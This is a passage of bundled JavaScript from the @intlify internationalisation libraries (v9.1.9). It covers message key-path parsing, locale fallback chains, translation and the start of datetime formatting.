    return hasOwnProperty.call(obj, key);
  }
  const isObject = (val) => (
    // eslint-disable-line
    val !== null && typeof val === "object"
  );
  const pathStateMachine = [];
  pathStateMachine[
    0
    /* BEFORE_PATH */
  ] = {
    [
      "w"
      /* WORKSPACE */
    ]: [
      0
      /* BEFORE_PATH */
    ],
    [
      "i"
      /* IDENT */
    ]: [
      3,
      0
      /* APPEND */
    ],
    [
      "["
      /* LEFT_BRACKET */
    ]: [
      4
      /* IN_SUB_PATH */
    ],
    [
      "o"
      /* END_OF_FAIL */
    ]: [
      7
      /* AFTER_PATH */
    ]
  };
  pathStateMachine[
    1
    /* IN_PATH */
  ] = {
    [
      "w"
      /* WORKSPACE */
    ]: [
      1
      /* IN_PATH */
    ],
    [
      "."
      /* DOT */
    ]: [
      2
      /* BEFORE_IDENT */
    ],
    [
      "["
      /* LEFT_BRACKET */
    ]: [
      4
      /* IN_SUB_PATH */
    ],
    [
      "o"
      /* END_OF_FAIL */
    ]: [
      7
      /* AFTER_PATH */
    ]
  };
  pathStateMachine[
    2
    /* BEFORE_IDENT */
  ] = {
    [
      "w"
      /* WORKSPACE */
    ]: [
      2
      /* BEFORE_IDENT */
    ],
    [
      "i"
      /* IDENT */
    ]: [
      3,
      0
      /* APPEND */
    ],
    [
      "0"
      /* ZERO */
    ]: [
      3,
      0
      /* APPEND */
    ]
  };
  pathStateMachine[
    3
    /* IN_IDENT */
  ] = {
    [
      "i"
      /* IDENT */
    ]: [
      3,
      0
      /* APPEND */
    ],
    [
      "0"
      /* ZERO */
    ]: [
      3,
      0
      /* APPEND */
    ],
    [
      "w"
      /* WORKSPACE */
    ]: [
      1,
      1
      /* PUSH */
    ],
    [
      "."
      /* DOT */
    ]: [
      2,
      1
      /* PUSH */
    ],
    [
      "["
      /* LEFT_BRACKET */
    ]: [
      4,
      1
      /* PUSH */
    ],
    [
      "o"
      /* END_OF_FAIL */
    ]: [
      7,
      1
      /* PUSH */
    ]
  };
  pathStateMachine[
    4
    /* IN_SUB_PATH */
  ] = {
    [
      "'"
      /* SINGLE_QUOTE */
    ]: [
      5,
      0
      /* APPEND */
    ],
    [
      '"'
      /* DOUBLE_QUOTE */
    ]: [
      6,
      0
      /* APPEND */
    ],
    [
      "["
      /* LEFT_BRACKET */
    ]: [
      4,
      2
      /* INC_SUB_PATH_DEPTH */
    ],
    [
      "]"
      /* RIGHT_BRACKET */
    ]: [
      1,
      3
      /* PUSH_SUB_PATH */
    ],
    [
      "o"
      /* END_OF_FAIL */
    ]: 8,
    [
      "l"
      /* ELSE */
    ]: [
      4,
      0
      /* APPEND */
    ]
  };
  pathStateMachine[
    5
    /* IN_SINGLE_QUOTE */
  ] = {
    [
      "'"
      /* SINGLE_QUOTE */
    ]: [
      4,
      0
      /* APPEND */
    ],
    [
      "o"
      /* END_OF_FAIL */
    ]: 8,
    [
      "l"
      /* ELSE */
    ]: [
      5,
      0
      /* APPEND */
    ]
  };
  pathStateMachine[
    6
    /* IN_DOUBLE_QUOTE */
  ] = {
    [
      '"'
      /* DOUBLE_QUOTE */
    ]: [
      4,
      0
      /* APPEND */
    ],
    [
      "o"
      /* END_OF_FAIL */
    ]: 8,
    [
      "l"
      /* ELSE */
    ]: [
      6,
      0
      /* APPEND */
    ]
  };
  const literalValueRE = /^\s?(?:true|false|-?[\d.]+|'[^']*'|"[^"]*")\s?$/;
  function isLiteral(exp) {
    return literalValueRE.test(exp);
  }
  function stripQuotes(str) {
    const a = str.charCodeAt(0);
    const b = str.charCodeAt(str.length - 1);
    return a === b && (a === 34 || a === 39) ? str.slice(1, -1) : str;
  }
  function getPathCharType(ch) {
    if (ch === void 0 || ch === null) {
      return "o";
    }
    const code = ch.charCodeAt(0);
    switch (code) {
      case 91:
      case 93:
      case 46:
      case 34:
      case 39:
        return ch;
      case 95:
      case 36:
      case 45:
        return "i";
      case 9:
      case 10:
      case 13:
      case 160:
      case 65279:
      case 8232:
      case 8233:
        return "w";
    }
    return "i";
  }
  function formatSubPath(path) {
    const trimmed = path.trim();
    if (path.charAt(0) === "0" && isNaN(parseInt(path))) {
      return false;
    }
    return isLiteral(trimmed) ? stripQuotes(trimmed) : "*" + trimmed;
  }
  function parse(path) {
    const keys = [];
    let index = -1;
    let mode = 0;
    let subPathDepth = 0;
    let c;
    let key;
    let newChar;
    let type;
    let transition;
    let action;
    let typeMap;
    const actions = [];
    actions[
      0
      /* APPEND */
    ] = () => {
      if (key === void 0) {
        key = newChar;
      } else {
        key += newChar;
      }
    };
    actions[
      1
      /* PUSH */
    ] = () => {
      if (key !== void 0) {
        keys.push(key);
        key = void 0;
      }
    };
    actions[
      2
      /* INC_SUB_PATH_DEPTH */
    ] = () => {
      actions[
        0
        /* APPEND */
      ]();
      subPathDepth++;
    };
    actions[
      3
      /* PUSH_SUB_PATH */
    ] = () => {
      if (subPathDepth > 0) {
        subPathDepth--;
        mode = 4;
        actions[
          0
          /* APPEND */
        ]();
      } else {
        subPathDepth = 0;
        if (key === void 0) {
          return false;
        }
        key = formatSubPath(key);
        if (key === false) {
          return false;
        } else {
          actions[
            1
            /* PUSH */
          ]();
        }
      }
    };
    function maybeUnescapeQuote() {
      const nextChar = path[index + 1];
      if (mode === 5 && nextChar === "'" || mode === 6 && nextChar === '"') {
        index++;
        newChar = "\\" + nextChar;
        actions[
          0
          /* APPEND */
        ]();
        return true;
      }
    }
    while (mode !== null) {
      index++;
      c = path[index];
      if (c === "\\" && maybeUnescapeQuote()) {
        continue;
      }
      type = getPathCharType(c);
      typeMap = pathStateMachine[mode];
      transition = typeMap[type] || typeMap[
        "l"
        /* ELSE */
      ] || 8;
      if (transition === 8) {
        return;
      }
      mode = transition[0];
      if (transition[1] !== void 0) {
        action = actions[transition[1]];
        if (action) {
          newChar = c;
          if (action() === false) {
            return;
          }
        }
      }
      if (mode === 7) {
        return keys;
      }
    }
  }
  const cache = /* @__PURE__ */ new Map();
  function resolveValue(obj, path) {
    if (!isObject(obj)) {
      return null;
    }
    let hit = cache.get(path);
    if (!hit) {
      hit = parse(path);
      if (hit) {
        cache.set(path, hit);
      }
    }
    if (!hit) {
      return null;
    }
    const len = hit.length;
    let last = obj;
    let i = 0;
    while (i < len) {
      const val = last[hit[i]];
      if (val === void 0) {
        return null;
      }
      last = val;
      i++;
    }
    return last;
  }
  function handleFlatJson(obj) {
    if (!isObject(obj)) {
      return obj;
    }
    for (const key in obj) {
      if (!hasOwn(obj, key)) {
        continue;
      }
      if (!key.includes(
        "."
        /* DOT */
      )) {
        if (isObject(obj[key])) {
          handleFlatJson(obj[key]);
        }
      } else {
        const subKeys = key.split(
          "."
          /* DOT */
        );
        const lastIndex = subKeys.length - 1;
        let currentObj = obj;
        for (let i = 0; i < lastIndex; i++) {
          if (!(subKeys[i] in currentObj)) {
            currentObj[subKeys[i]] = {};
          }
          currentObj = currentObj[subKeys[i]];
        }
        currentObj[subKeys[lastIndex]] = obj[key];
        delete obj[key];
        if (isObject(currentObj[subKeys[lastIndex]])) {
          handleFlatJson(currentObj[subKeys[lastIndex]]);
        }
      }
    }
    return obj;
  }
  /*!
    * @intlify/runtime v9.1.9
    * (c) 2021 kazuya kawaguchi
    * Released under the MIT License.
    */
  const DEFAULT_MODIFIER = (str) => str;
  const DEFAULT_MESSAGE = (ctx) => "";
  const DEFAULT_MESSAGE_DATA_TYPE = "text";
  const DEFAULT_NORMALIZE = (values) => values.length === 0 ? "" : values.join("");
  const DEFAULT_INTERPOLATE = toDisplayString;
  function pluralDefault(choice, choicesLength) {
    choice = Math.abs(choice);
    if (choicesLength === 2) {
      return choice ? choice > 1 ? 1 : 0 : 1;
    }
    return choice ? Math.min(choice, 2) : 0;
  }
  function getPluralIndex(options) {
    const index = isNumber(options.pluralIndex) ? options.pluralIndex : -1;
    return options.named && (isNumber(options.named.count) || isNumber(options.named.n)) ? isNumber(options.named.count) ? options.named.count : isNumber(options.named.n) ? options.named.n : index : index;
  }
  function normalizeNamed(pluralIndex, props) {
    if (!props.count) {
      props.count = pluralIndex;
    }
    if (!props.n) {
      props.n = pluralIndex;
    }
  }
  function createMessageContext(options = {}) {
    const locale = options.locale;
    const pluralIndex = getPluralIndex(options);
    const pluralRule = isObject$1(options.pluralRules) && isString(locale) && isFunction(options.pluralRules[locale]) ? options.pluralRules[locale] : pluralDefault;
    const orgPluralRule = isObject$1(options.pluralRules) && isString(locale) && isFunction(options.pluralRules[locale]) ? pluralDefault : void 0;
    const plural = (messages2) => messages2[pluralRule(pluralIndex, messages2.length, orgPluralRule)];
    const _list = options.list || [];
    const list = (index) => _list[index];
    const _named = options.named || {};
    isNumber(options.pluralIndex) && normalizeNamed(pluralIndex, _named);
    const named = (key) => _named[key];
    function message(key) {
      const msg = isFunction(options.messages) ? options.messages(key) : isObject$1(options.messages) ? options.messages[key] : false;
      return !msg ? options.parent ? options.parent.message(key) : DEFAULT_MESSAGE : msg;
    }
    const _modifier = (name) => options.modifiers ? options.modifiers[name] : DEFAULT_MODIFIER;
    const normalize = isPlainObject(options.processor) && isFunction(options.processor.normalize) ? options.processor.normalize : DEFAULT_NORMALIZE;
    const interpolate = isPlainObject(options.processor) && isFunction(options.processor.interpolate) ? options.processor.interpolate : DEFAULT_INTERPOLATE;
    const type = isPlainObject(options.processor) && isString(options.processor.type) ? options.processor.type : DEFAULT_MESSAGE_DATA_TYPE;
    const ctx = {
      [
        "list"
        /* LIST */
      ]: list,
      [
        "named"
        /* NAMED */
      ]: named,
      [
        "plural"
        /* PLURAL */
      ]: plural,
      [
        "linked"
        /* LINKED */
      ]: (key, modifier) => {
        const msg = message(key)(ctx);
        return isString(modifier) ? _modifier(modifier)(msg) : msg;
      },
      [
        "message"
        /* MESSAGE */
      ]: message,
      [
        "type"
        /* TYPE */
      ]: type,
      [
        "interpolate"
        /* INTERPOLATE */
      ]: interpolate,
      [
        "normalize"
        /* NORMALIZE */
      ]: normalize
    };
    return ctx;
  }
  /*!
    * @intlify/message-compiler v9.1.9
    * (c) 2021 kazuya kawaguchi
    * Released under the MIT License.
    */
  const errorMessages$2 = {
    // tokenizer error messages
    [
      0
      /* EXPECTED_TOKEN */
    ]: `Expected token: '{0}'`,
    [
      1
      /* INVALID_TOKEN_IN_PLACEHOLDER */
    ]: `Invalid token in placeholder: '{0}'`,
    [
      2
      /* UNTERMINATED_SINGLE_QUOTE_IN_PLACEHOLDER */
    ]: `Unterminated single quote in placeholder`,
    [
      3
      /* UNKNOWN_ESCAPE_SEQUENCE */
    ]: `Unknown escape sequence: \\{0}`,
    [
      4
      /* INVALID_UNICODE_ESCAPE_SEQUENCE */
    ]: `Invalid unicode escape sequence: {0}`,
    [
      5
      /* UNBALANCED_CLOSING_BRACE */
    ]: `Unbalanced closing brace`,
    [
      6
      /* UNTERMINATED_CLOSING_BRACE */
    ]: `Unterminated closing brace`,
    [
      7
      /* EMPTY_PLACEHOLDER */
    ]: `Empty placeholder`,
    [
      8
      /* NOT_ALLOW_NEST_PLACEHOLDER */
    ]: `Not allowed nest placeholder`,
    [
      9
      /* INVALID_LINKED_FORMAT */
    ]: `Invalid linked format`,
    // parser error messages
    [
      10
      /* MUST_HAVE_MESSAGES_IN_PLURAL */
    ]: `Plural must have messages`,
    [
      11
      /* UNEXPECTED_EMPTY_LINKED_MODIFIER */
    ]: `Unexpected empty linked modifier`,
    [
      12
      /* UNEXPECTED_EMPTY_LINKED_KEY */
    ]: `Unexpected empty linked key`,
    [
      13
      /* UNEXPECTED_LEXICAL_ANALYSIS */
    ]: `Unexpected lexical analysis in token: '{0}'`
  };
  function createCompileError(code, loc, options = {}) {
    const { domain, messages: messages2, args } = options;
    const msg = format((messages2 || errorMessages$2)[code] || "", ...args || []);
    const error = new SyntaxError(String(msg));
    error.code = code;
    if (loc) {
      error.location = loc;
    }
    error.domain = domain;
    return error;
  }
  /*!
    * @intlify/devtools-if v9.1.9
    * (c) 2021 kazuya kawaguchi
    * Released under the MIT License.
    */
  const IntlifyDevToolsHooks = {
    I18nInit: "i18n:init",
    FunctionTranslate: "function:translate"
  };
  /*!
    * @intlify/core-base v9.1.9
    * (c) 2021 kazuya kawaguchi
    * Released under the MIT License.
    */
  let devtools = null;
  function setDevToolsHook(hook) {
    devtools = hook;
  }
  function initI18nDevTools(i18n2, version, meta) {
    devtools && devtools.emit(IntlifyDevToolsHooks.I18nInit, {
      timestamp: Date.now(),
      i18n: i18n2,
      version,
      meta
    });
  }
  const translateDevTools = /* @__PURE__ */ createDevToolsHook(IntlifyDevToolsHooks.FunctionTranslate);
  function createDevToolsHook(hook) {
    return (payloads) => devtools && devtools.emit(hook, payloads);
  }
  const warnMessages$1 = {
    [
      0
      /* NOT_FOUND_KEY */
    ]: `Not found '{key}' key in '{locale}' locale messages.`,
    [
      1
      /* FALLBACK_TO_TRANSLATE */
    ]: `Fall back to translate '{key}' key with '{target}' locale.`,
    [
      2
      /* CANNOT_FORMAT_NUMBER */
    ]: `Cannot format a number value due to not supported Intl.NumberFormat.`,
    [
      3
      /* FALLBACK_TO_NUMBER_FORMAT */
    ]: `Fall back to number format '{key}' key with '{target}' locale.`,
    [
      4
      /* CANNOT_FORMAT_DATE */
    ]: `Cannot format a date value due to not supported Intl.DateTimeFormat.`,
    [
      5
      /* FALLBACK_TO_DATE_FORMAT */
    ]: `Fall back to datetime format '{key}' key with '{target}' locale.`
  };
  function getWarnMessage$1(code, ...args) {
    return format(warnMessages$1[code], ...args);
  }
  const VERSION$1 = "9.1.9";
  const NOT_REOSLVED = -1;
  const MISSING_RESOLVE_VALUE = "";
  function getDefaultLinkedModifiers() {
    return {
      upper: (val) => isString(val) ? val.toUpperCase() : val,
      lower: (val) => isString(val) ? val.toLowerCase() : val,
      // prettier-ignore
      capitalize: (val) => isString(val) ? `${val.charAt(0).toLocaleUpperCase()}${val.substr(1)}` : val
    };
  }
  let _compiler;
  let _additionalMeta = null;
  const setAdditionalMeta = (meta) => {
    _additionalMeta = meta;
  };
  const getAdditionalMeta = () => _additionalMeta;
  let _cid = 0;
  function createCoreContext(options = {}) {
    const version = isString(options.version) ? options.version : VERSION$1;
    const locale = isString(options.locale) ? options.locale : "en-US";
    const fallbackLocale = isArray(options.fallbackLocale) || isPlainObject(options.fallbackLocale) || isString(options.fallbackLocale) || options.fallbackLocale === false ? options.fallbackLocale : locale;
    const messages2 = isPlainObject(options.messages) ? options.messages : { [locale]: {} };
    const datetimeFormats = isPlainObject(options.datetimeFormats) ? options.datetimeFormats : { [locale]: {} };
    const numberFormats = isPlainObject(options.numberFormats) ? options.numberFormats : { [locale]: {} };
    const modifiers = assign({}, options.modifiers || {}, getDefaultLinkedModifiers());
    const pluralRules = options.pluralRules || {};
    const missing = isFunction(options.missing) ? options.missing : null;
    const missingWarn = isBoolean(options.missingWarn) || isRegExp(options.missingWarn) ? options.missingWarn : true;
    const fallbackWarn = isBoolean(options.fallbackWarn) || isRegExp(options.fallbackWarn) ? options.fallbackWarn : true;
    const fallbackFormat = !!options.fallbackFormat;
    const unresolving = !!options.unresolving;
    const postTranslation = isFunction(options.postTranslation) ? options.postTranslation : null;
    const processor = isPlainObject(options.processor) ? options.processor : null;
    const warnHtmlMessage = isBoolean(options.warnHtmlMessage) ? options.warnHtmlMessage : true;
    const escapeParameter = !!options.escapeParameter;
    const messageCompiler = isFunction(options.messageCompiler) ? options.messageCompiler : _compiler;
    const onWarn = isFunction(options.onWarn) ? options.onWarn : warn;
    const internalOptions = options;
    const __datetimeFormatters = isObject$1(internalOptions.__datetimeFormatters) ? internalOptions.__datetimeFormatters : /* @__PURE__ */ new Map();
    const __numberFormatters = isObject$1(internalOptions.__numberFormatters) ? internalOptions.__numberFormatters : /* @__PURE__ */ new Map();
    const __meta = isObject$1(internalOptions.__meta) ? internalOptions.__meta : {};
    _cid++;
    const context = {
      version,
      cid: _cid,
      locale,
      fallbackLocale,
      messages: messages2,
      datetimeFormats,
      numberFormats,
      modifiers,
      pluralRules,
      missing,
      missingWarn,
      fallbackWarn,
      fallbackFormat,
      unresolving,
      postTranslation,
      processor,
      warnHtmlMessage,
      escapeParameter,
      messageCompiler,
      onWarn,
      __datetimeFormatters,
      __numberFormatters,
      __meta
    };
    {
      context.__v_emitter = internalOptions.__v_emitter != null ? internalOptions.__v_emitter : void 0;
    }
    {
      initI18nDevTools(context, version, __meta);
    }
    return context;
  }
  function isTranslateFallbackWarn(fallback, key) {
    return fallback instanceof RegExp ? fallback.test(key) : fallback;
  }
  function isTranslateMissingWarn(missing, key) {
    return missing instanceof RegExp ? missing.test(key) : missing;
  }
  function handleMissing(context, key, locale, missingWarn, type) {
    const { missing, onWarn } = context;
    {
      const emitter = context.__v_emitter;
      if (emitter) {
        emitter.emit("missing", {
          locale,
          key,
          type,
          groupId: `${type}:${key}`
        });
      }
    }
    if (missing !== null) {
      const ret = missing(context, locale, key, type);
      return isString(ret) ? ret : key;
    } else {
      if (isTranslateMissingWarn(missingWarn, key)) {
        onWarn(getWarnMessage$1(0, { key, locale }));
      }
      return key;
    }
  }
  function getLocaleChain(ctx, fallback, start) {
    const context = ctx;
    if (!context.__localeChainCache) {
      context.__localeChainCache = /* @__PURE__ */ new Map();
    }
    let chain = context.__localeChainCache.get(start);
    if (!chain) {
      chain = [];
      let block = [start];
      while (isArray(block)) {
        block = appendBlockToChain(chain, block, fallback);
      }
      const defaults = isArray(fallback) ? fallback : isPlainObject(fallback) ? fallback["default"] ? fallback["default"] : null : fallback;
      block = isString(defaults) ? [defaults] : defaults;
      if (isArray(block)) {
        appendBlockToChain(chain, block, false);
      }
      context.__localeChainCache.set(start, chain);
    }
    return chain;
  }
  function appendBlockToChain(chain, block, blocks) {
    let follow = true;
    for (let i = 0; i < block.length && isBoolean(follow); i++) {
      const locale = block[i];
      if (isString(locale)) {
        follow = appendLocaleToChain(chain, block[i], blocks);
      }
    }
    return follow;
  }
  function appendLocaleToChain(chain, locale, blocks) {
    let follow;
    const tokens = locale.split("-");
    do {
      const target = tokens.join("-");
      follow = appendItemToChain(chain, target, blocks);
      tokens.splice(-1, 1);
    } while (tokens.length && follow === true);
    return follow;
  }
  function appendItemToChain(chain, target, blocks) {
    let follow = false;
    if (!chain.includes(target)) {
      follow = true;
      if (target) {
        follow = target[target.length - 1] !== "!";
        const locale = target.replace(/!/g, "");
        chain.push(locale);
        if ((isArray(blocks) || isPlainObject(blocks)) && blocks[locale]) {
          follow = blocks[locale];
        }
      }
    }
    return follow;
  }
  function updateFallbackLocale(ctx, locale, fallback) {
    const context = ctx;
    context.__localeChainCache = /* @__PURE__ */ new Map();
    getLocaleChain(ctx, fallback, locale);
  }
  function createCoreError(code) {
    return createCompileError(code, null, { messages: errorMessages$1 });
  }
  const errorMessages$1 = {
    [
      14
      /* INVALID_ARGUMENT */
    ]: "Invalid arguments",
    [
      15
      /* INVALID_DATE_ARGUMENT */
    ]: "The date provided is an invalid Date object.Make sure your Date represents a valid date.",
    [
      16
      /* INVALID_ISO_DATE_ARGUMENT */
    ]: "The argument provided is not a valid ISO date string"
  };
  const NOOP_MESSAGE_FUNCTION = () => "";
  const isMessageFunction = (val) => isFunction(val);
  function translate(context, ...args) {
    const { fallbackFormat, postTranslation, unresolving, fallbackLocale, messages: messages2 } = context;
    const [key, options] = parseTranslateArgs(...args);
    const missingWarn = isBoolean(options.missingWarn) ? options.missingWarn : context.missingWarn;
    const fallbackWarn = isBoolean(options.fallbackWarn) ? options.fallbackWarn : context.fallbackWarn;
    const escapeParameter = isBoolean(options.escapeParameter) ? options.escapeParameter : context.escapeParameter;
    const resolvedMessage = !!options.resolvedMessage;
    const defaultMsgOrKey = isString(options.default) || isBoolean(options.default) ? !isBoolean(options.default) ? options.default : key : fallbackFormat ? key : "";
    const enableDefaultMsg = fallbackFormat || defaultMsgOrKey !== "";
    const locale = isString(options.locale) ? options.locale : context.locale;
    escapeParameter && escapeParams(options);
    let [format2, targetLocale, message] = !resolvedMessage ? resolveMessageFormat(context, key, locale, fallbackLocale, fallbackWarn, missingWarn) : [
      key,
      locale,
      messages2[locale] || {}
    ];
    let cacheBaseKey = key;
    if (!resolvedMessage && !(isString(format2) || isMessageFunction(format2))) {
      if (enableDefaultMsg) {
        format2 = defaultMsgOrKey;
        cacheBaseKey = format2;
      }
    }
    if (!resolvedMessage && (!(isString(format2) || isMessageFunction(format2)) || !isString(targetLocale))) {
      return unresolving ? NOT_REOSLVED : key;
    }
    if (isString(format2) && context.messageCompiler == null) {
      warn(`The message format compilation is not supported in this build. Because message compiler isn't included. You need to pre-compilation all message format. So translate function return '${key}'.`);
      return key;
    }
    let occurred = false;
    const errorDetector = () => {
      occurred = true;
    };
    const msg = !isMessageFunction(format2) ? compileMessageFormat(context, key, targetLocale, format2, cacheBaseKey, errorDetector) : format2;
    if (occurred) {
      return format2;
    }
    const ctxOptions = getMessageContextOptions(context, targetLocale, message, options);
    const msgContext = createMessageContext(ctxOptions);
    const messaged = evaluateMessage(context, msg, msgContext);
    const ret = postTranslation ? postTranslation(messaged) : messaged;
    {
      const payloads = {
        timestamp: Date.now(),
        key: isString(key) ? key : isMessageFunction(format2) ? format2.key : "",
        locale: targetLocale || (isMessageFunction(format2) ? format2.locale : ""),
        format: isString(format2) ? format2 : isMessageFunction(format2) ? format2.source : "",
        message: ret
      };
      payloads.meta = assign({}, context.__meta, getAdditionalMeta() || {});
      translateDevTools(payloads);
    }
    return ret;
  }
  function escapeParams(options) {
    if (isArray(options.list)) {
      options.list = options.list.map((item) => isString(item) ? escapeHtml(item) : item);
    } else if (isObject$1(options.named)) {
      Object.keys(options.named).forEach((key) => {
        if (isString(options.named[key])) {
          options.named[key] = escapeHtml(options.named[key]);
        }
      });
    }
  }
  function resolveMessageFormat(context, key, locale, fallbackLocale, fallbackWarn, missingWarn) {
    const { messages: messages2, onWarn } = context;
    const locales = getLocaleChain(context, fallbackLocale, locale);
    let message = {};
    let targetLocale;
    let format2 = null;
    let from = locale;
    let to = null;
    const type = "translate";
    for (let i = 0; i < locales.length; i++) {
      targetLocale = to = locales[i];
      if (locale !== targetLocale && isTranslateFallbackWarn(fallbackWarn, key)) {
        onWarn(getWarnMessage$1(1, {
          key,
          target: targetLocale
        }));
      }
      if (locale !== targetLocale) {
        const emitter = context.__v_emitter;
        if (emitter) {
          emitter.emit("fallback", {
            type,
            key,
            from,
            to,
            groupId: `${type}:${key}`
          });
        }
      }
      message = messages2[targetLocale] || {};
      let start = null;
      let startTag;
      let endTag;
      if (inBrowser) {
        start = window.performance.now();
        startTag = "intlify-message-resolve-start";
        endTag = "intlify-message-resolve-end";
        mark && mark(startTag);
      }
      if ((format2 = resolveValue(message, key)) === null) {
        format2 = message[key];
      }
      if (inBrowser) {
        const end = window.performance.now();
        const emitter = context.__v_emitter;
        if (emitter && start && format2) {
          emitter.emit("message-resolve", {
            type: "message-resolve",
            key,
            message: format2,
            time: end - start,
            groupId: `${type}:${key}`
          });
        }
        if (startTag && endTag && mark && measure) {
          mark(endTag);
          measure("intlify message resolve", startTag, endTag);
        }
      }
      if (isString(format2) || isFunction(format2))
        break;
      const missingRet = handleMissing(context, key, targetLocale, missingWarn, type);
      if (missingRet !== key) {
        format2 = missingRet;
      }
      from = to;
    }
    return [format2, targetLocale, message];
  }
  function compileMessageFormat(context, key, targetLocale, format2, cacheBaseKey, errorDetector) {
    const { messageCompiler, warnHtmlMessage } = context;
    if (isMessageFunction(format2)) {
      const msg2 = format2;
      msg2.locale = msg2.locale || targetLocale;
      msg2.key = msg2.key || key;
      return msg2;
    }
    let start = null;
    let startTag;
    let endTag;
    if (inBrowser) {
      start = window.performance.now();
      startTag = "intlify-message-compilation-start";
      endTag = "intlify-message-compilation-end";
      mark && mark(startTag);
    }
    const msg = messageCompiler(format2, getCompileOptions(context, targetLocale, cacheBaseKey, format2, warnHtmlMessage, errorDetector));
    if (inBrowser) {
      const end = window.performance.now();
      const emitter = context.__v_emitter;
      if (emitter && start) {
        emitter.emit("message-compilation", {
          type: "message-compilation",
          message: format2,
          time: end - start,
          groupId: `${"translate"}:${key}`
        });
      }
      if (startTag && endTag && mark && measure) {
        mark(endTag);
        measure("intlify message compilation", startTag, endTag);
      }
    }
    msg.locale = targetLocale;
    msg.key = key;
    msg.source = format2;
    return msg;
  }
  function evaluateMessage(context, msg, msgCtx) {
    let start = null;
    let startTag;
    let endTag;
    if (inBrowser) {
      start = window.performance.now();
      startTag = "intlify-message-evaluation-start";
      endTag = "intlify-message-evaluation-end";
      mark && mark(startTag);
    }
    const messaged = msg(msgCtx);
    if (inBrowser) {
      const end = window.performance.now();
      const emitter = context.__v_emitter;
      if (emitter && start) {
        emitter.emit("message-evaluation", {
          type: "message-evaluation",
          value: messaged,
          time: end - start,
          groupId: `${"translate"}:${msg.key}`
        });
      }
      if (startTag && endTag && mark && measure) {
        mark(endTag);
        measure("intlify message evaluation", startTag, endTag);
      }
    }
    return messaged;
  }
  function parseTranslateArgs(...args) {
    const [arg1, arg2, arg3] = args;
    const options = {};
    if (!isString(arg1) && !isNumber(arg1) && !isMessageFunction(arg1)) {
      throw createCoreError(
        14
        /* INVALID_ARGUMENT */
      );
    }
    const key = isNumber(arg1) ? String(arg1) : isMessageFunction(arg1) ? arg1 : arg1;
    if (isNumber(arg2)) {
      options.plural = arg2;
    } else if (isString(arg2)) {
      options.default = arg2;
    } else if (isPlainObject(arg2) && !isEmptyObject(arg2)) {
      options.named = arg2;
    } else if (isArray(arg2)) {
      options.list = arg2;
    }
    if (isNumber(arg3)) {
      options.plural = arg3;
    } else if (isString(arg3)) {
      options.default = arg3;
    } else if (isPlainObject(arg3)) {
      assign(options, arg3);
    }
    return [key, options];
  }
  function getCompileOptions(context, locale, key, source, warnHtmlMessage, errorDetector) {
    return {
      warnHtmlMessage,
      onError: (err) => {
        errorDetector && errorDetector(err);
        {
          const message = `Message compilation error: ${err.message}`;
          const codeFrame = err.location && generateCodeFrame(source, err.location.start.offset, err.location.end.offset);
          const emitter = context.__v_emitter;
          if (emitter) {
            emitter.emit("compile-error", {
              message: source,
              error: err.message,
              start: err.location && err.location.start.offset,
              end: err.location && err.location.end.offset,
              groupId: `${"translate"}:${key}`
            });
          }
          console.error(codeFrame ? `${message}
${codeFrame}` : message);
        }
      },
      onCacheKey: (source2) => generateFormatCacheKey(locale, key, source2)
    };
  }
  function getMessageContextOptions(context, locale, message, options) {
    const { modifiers, pluralRules } = context;
    const resolveMessage = (key) => {
      const val = resolveValue(message, key);
      if (isString(val)) {
        let occurred = false;
        const errorDetector = () => {
          occurred = true;
        };
        const msg = compileMessageFormat(context, key, locale, val, key, errorDetector);
        return !occurred ? msg : NOOP_MESSAGE_FUNCTION;
      } else if (isMessageFunction(val)) {
        return val;
      } else {
        return NOOP_MESSAGE_FUNCTION;
      }
    };
    const ctxOptions = {
      locale,
      modifiers,
      pluralRules,
      messages: resolveMessage
    };
    if (context.processor) {
      ctxOptions.processor = context.processor;
    }
    if (options.list) {
      ctxOptions.list = options.list;
    }
    if (options.named) {
      ctxOptions.named = options.named;
    }
    if (isNumber(options.plural)) {
      ctxOptions.pluralIndex = options.plural;
    }
    return ctxOptions;
  }
  const intlDefined = typeof Intl !== "undefined";
  const Availabilities = {
    dateTimeFormat: intlDefined && typeof Intl.DateTimeFormat !== "undefined",
    numberFormat: intlDefined && typeof Intl.NumberFormat !== "undefined"
  };
  function datetime(context, ...args) {
    const { datetimeFormats, unresolving, fallbackLocale, onWarn } = context;
    const { __datetimeFormatters } = context;
    if (!Availabilities.dateTimeFormat) {
      onWarn(getWarnMessage$1(
        4
        /* CANNOT_FORMAT_DATE */
      ));
      return MISSING_RESOLVE_VALUE;
    }
    const [key, value, options, overrides] = parseDateTimeArgs(...args);
    const missingWarn = isBoolean(options.missingWarn) ? options.missingWarn : context.missingWarn;
    const fallbackWarn = isBoolean(options.fallbackWarn) ? options.fallbackWarn : context.fallbackWarn;
    const part = !!options.part;
    const locale = isString(options.locale) ? options.locale : context.locale;
    const locales = getLocaleChain(context, fallbackLocale, locale);
    if (!isString(key) || key === "") {
      return new Intl.DateTimeFormat(locale).format(value);
    }
    let datetimeFormat = {};
    let targetLocale;
    let format2 = null;
    let from = locale;
    let to = null;
    const type = "datetime format";
    for (let i = 0; i < locales.length; i++) {
      targetLocale = to = locales[i];
      if (locale !== targetLocale && isTranslateFallbackWarn(fallbackWarn, key)) {
        onWarn(getWarnMessage$1(5, {
          key,
          target: targetLocale
        }));
      }
      if (locale !== targetLocale) {
        const emitter = context.__v_emitter;
        if (emitter) {
          emitter.emit("fallback", {
            type,
            key,
            from,
            to,
            groupId: `${type}:${key}`
          });
        }
      }
      datetimeFormat = datetimeFormats[targetLocale] || {};
      format2 = datetimeFormat[key];
      if (isPlainObject(format2))
        break;
      handleMissing(context, key, targetLocale, missingWarn, type);
      from = to;
    }
    if (!isPlainObject(format2) || !isString(targetLocale)) {
      return unresolving ? NOT_REOSLVED : key;
    }
    let id = `${targetLocale}__${key}`;
    if (!isEmptyObject(overrides)) {
      id = `${id}__${JSON.stringify(overrides)}`;
    }
    let formatter = __datetimeFormatters.get(id);
    if (!formatter) {
      formatter = new Intl.DateTimeFormat(targetLocale, assign({}, format2, overrides));
      __datetimeFormatters.set(id, formatter);
    }
    return !part ? formatter.format(value) : formatter.formatToParts(value);
  }
  function parseDateTimeArgs(...args) {
    const [arg1, arg2, arg3, arg4] = args;
    let options = {};
    let overrides = {};
    let value;
    if (isString(arg1)) {
      if (!/\d{4}-\d{2}-\d{2}(T.*)?/.test(arg1)) {
        throw createCoreError(
          16
          /* INVALID_ISO_DATE_ARGUMENT */
        );
      }
      value = new Date(arg1);
      try {
        value.toISOString();
      } catch (e) {
        throw createCoreError(
          16
          /* INVALID_ISO_DATE_ARGUMENT */
        );
